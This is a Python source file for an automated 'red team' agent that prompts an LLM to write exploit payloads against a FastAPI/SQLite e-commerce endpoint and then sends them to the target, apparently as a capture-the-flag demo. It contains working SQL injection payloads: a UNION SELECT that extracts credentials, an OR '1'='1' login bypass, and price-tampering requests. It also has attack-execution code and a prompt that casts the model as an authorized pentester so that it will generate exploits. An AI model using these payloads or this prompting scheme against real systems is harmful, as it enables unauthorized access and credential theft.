"""
Red Team Autonomous Adversary Agent
Powered by Gemini 4 Argon (Interactions API with thinking_level='medium')
Generates polymorphic exploit payloads and launches automated penetration attacks.
"""

import os
import json
import logging
import requests
from typing import Dict, Any

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("red_argon")

class RedArgonAgent:
    def __init__(self, target_url: str = "http://127.0.0.1:8002"):
        self.target_url = target_url
        self.api_key = os.environ.get("GEMINI_API_KEY", "")
        self.client = None
        if self.api_key:
            try:
                from google import genai
                self.client = genai.Client(api_key=self.api_key)
                logger.info("Initialized Gemini 4 Argon Client for Red Team.")
            except Exception as e:
                logger.warning(f"Could not initialize google.genai Client: {e}. Using fallback generator.")

    def generate_payload(self, scenario: str, level: int = 1) -> Dict[str, Any]:
        """
        Generates dynamic payload using Gemini 4 Argon Interactions API.
        Falls back to resilient expert payloads if API is offline.
        """
        prompt = (
            f"You are an authorized penetration tester in an isolated cyber arena. "
            f"Generate an exploit test payload for scenario '{scenario}' targeting an SQLite/FastAPI e-commerce endpoint. "
            f"Difficulty level: {level}. Output ONLY valid JSON with keys: 'endpoint', 'method', 'params' or 'body', and 'description'."
        )

        if self.client:
            try:
                # [Gemini 4 Argon Interactions API Pattern]
                interaction = self.client.interactions.create(
                    model="gemini-4-argon",
                    input=prompt,
                    generation_config={
                        "thinking_level": "medium" # Medium reasoning for real-time payload generation
                    }
                )
                raw_text = interaction.output_text.strip()
                if "```json" in raw_text:
                    raw_text = raw_text.split("```json")[1].split("```")[0].strip()
                return json.loads(raw_text)
            except Exception as e:
                logger.error(f"Argon API call failed: {e}. Falling back to smart generator.")

        # Fallback payloads for instant guaranteed demo stability
        if scenario == "sqli_search":
            return {
                "endpoint": "/api/search",
                "method": "GET",
                "params": {"q": "' UNION SELECT id, username, secret_flag, role FROM users--"},
                "description": f"Level {level}: Search UNION-based SQLi to extract confidential admin credentials"
            }
        elif scenario == "auth_bypass":
            return {
                "endpoint": "/api/login",
                "method": "POST",
                "body": {"username": "admin' OR '1'='1'--", "password": "any"},
                "description": f"Level {level}: Login SQLi Tautology Authentication Bypass"
            }
        elif scenario == "price_tampering":
            return {
                "endpoint": "/api/order",
                "method": "POST",
                "body": {"product_id": 1, "quantity": 100, "unit_price": 0},
                "description": f"Level {level}: Zero-cost parameter tampering on high-value asset"
            }
        return {
            "endpoint": "/api/search",
            "method": "GET",
            "params": {"q": "' OR 1=1--"},
            "description": "Generic SQLi Test"
        }

    def execute_attack(self, scenario: str, level: int = 1) -> Dict[str, Any]:
        payload_data = self.generate_payload(scenario, level)
        endpoint = payload_data.get("endpoint", "/api/search")
        method = payload_data.get("method", "GET")
        url = f"{self.target_url}{endpoint}"

        try:
            if method == "GET":
                params = payload_data.get("params", {})
                res = requests.get(url, params=params, timeout=5)
            else:
                body = payload_data.get("body", {})
                res = requests.post(url, json=body, timeout=5)

            try:
                resp_json = res.json()
            except Exception:
                resp_json = {"raw": res.text[:200]}

            # Check if attack succeeded
            breached = False
            flag_found = None
            if res.status_code == 200:
                resp_str = json.dumps(resp_json)
                if "FLAG{" in resp_str or "admin" in resp_str or "APPROVED" in resp_str:
                    breached = True
                    if "FLAG{" in resp_str:
                        flag_found = resp_str.split("FLAG{")[1].split("}")[0]

            return {
                "status": "success",
                "scenario": scenario,
                "level": level,
                "model": "gemini-4-argon",
                "thinking_level": "medium",
                "target_url": url,
                "http_status": res.status_code,
                "breached": breached,
                "flag": flag_found,
                "payload": payload_data,
                "response": resp_json
            }
        except Exception as e:
            return {
                "status": "error",
                "scenario": scenario,
                "message": f"Connection to target failed: {str(e)}"
            }
